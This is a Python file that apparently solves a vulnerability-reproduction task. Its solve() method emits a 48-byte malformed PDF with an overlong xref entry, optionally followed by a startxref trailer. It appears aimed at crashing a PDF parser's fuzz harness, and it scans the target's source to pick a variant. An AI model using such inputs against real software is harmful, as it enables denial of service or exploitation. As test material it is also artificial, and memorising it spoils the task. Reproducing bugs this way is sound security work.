import os
import re
import tarfile
from typing import Iterator, Tuple, Optional


class Solution:
    def _iter_source_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    path = os.path.join(root, fn)
                    try:
                        st = os.stat(path)
                    except OSError:
                        continue
                    if st.st_size <= 0 or st.st_size > 8 * 1024 * 1024:
                        continue
                    try:
                        with open(path, "rb") as f:
                            yield path, f.read()
                    except OSError:
                        continue
            return

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        if m.size <= 0 or m.size > 8 * 1024 * 1024:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                            yield m.name, data
                        except Exception:
                            continue
            except Exception:
                return
            return

        try:
            st = os.stat(src_path)
            if st.st_size <= 0 or st.st_size > 8 * 1024 * 1024:
                return
            with open(src_path, "rb") as f:
                yield src_path, f.read()
        except OSError:
            return

    def _looks_text(self, name: str) -> bool:
        lname = name.lower()
        exts = (
            ".c",
            ".cc",
            ".cpp",
            ".cxx",
            ".h",
            ".hh",
            ".hpp",
            ".hxx",
            ".inc",
            ".inl",
            ".txt",
            ".md",
            ".cmake",
            ".mak",
            ".make",
            ".mk",
            ".am",
            ".ac",
            ".sh",
            ".py",
            ".java",
            ".rs",
        )
        if lname.endswith(exts):
            return True
        base = os.path.basename(lname)
        if "fuzz" in base or "fuzzer" in base:
            return True
        return False

    def _detect_attempt_recovery(self, src_path: str) -> bool:
        # Return True only if explicitly enabled in fuzzer/harness code.
        # Otherwise default to False (safer: include startxref).
        haystack = []
        for name, data in self._iter_source_files(src_path):
            if not self._looks_text(name):
                continue
            if b"LLVMFuzzerTestOneInput" in data or b"setAttemptRecovery" in data or b"AttemptRecovery" in data:
                try:
                    txt = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                haystack.append((name, txt))

        if not haystack:
            for name, data in self._iter_source_files(src_path):
                if not self._looks_text(name):
                    continue
                if b"fuzz" not in name.lower().encode("utf-8", errors="ignore") and b"fuzzer" not in name.lower().encode(
                    "utf-8", errors="ignore"
                ):
                    continue
                try:
                    txt = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                haystack.append((name, txt))

        true_pats = [
            r"\bsetAttemptRecovery\s*\(\s*true\s*\)",
            r"\bset_attempt_recovery\s*\(\s*true\s*\)",
            r"\battempt_recovery\s*=\s*true\b",
        ]
        false_pats = [
            r"\bsetAttemptRecovery\s*\(\s*false\s*\)",
            r"\bset_attempt_recovery\s*\(\s*false\s*\)",
            r"\battempt_recovery\s*=\s*false\b",
        ]

        saw_any = False
        saw_true = False
        saw_false = False

        for _, txt in haystack:
            for pat in true_pats:
                if re.search(pat, txt):
                    saw_any = True
                    saw_true = True
            for pat in false_pats:
                if re.search(pat, txt):
                    saw_any = True
                    saw_false = True

        if saw_true and not saw_false:
            return True
        if saw_false and not saw_true:
            return False
        if saw_true and saw_false:
            # Prefer safety; include startxref.
            return False
        if not saw_any:
            return False
        return False

    def solve(self, src_path: str) -> bytes:
        prefix = b"%PDF-1.0\nxref\n0 1\n"
        entry = (b"0" * 20) + b" " + (b"0" * 5) + b" f \n"
        poc48 = prefix + entry  # 48 bytes

        if self._detect_attempt_recovery(src_path):
            return poc48

        # More reliable: include startxref and %%EOF so non-recovery parsers still reach xref parsing.
        # xref begins at offset 9 (len("%PDF-1.0\n") == 9).
        return poc48 + b"startxref\n9\n%%EOF"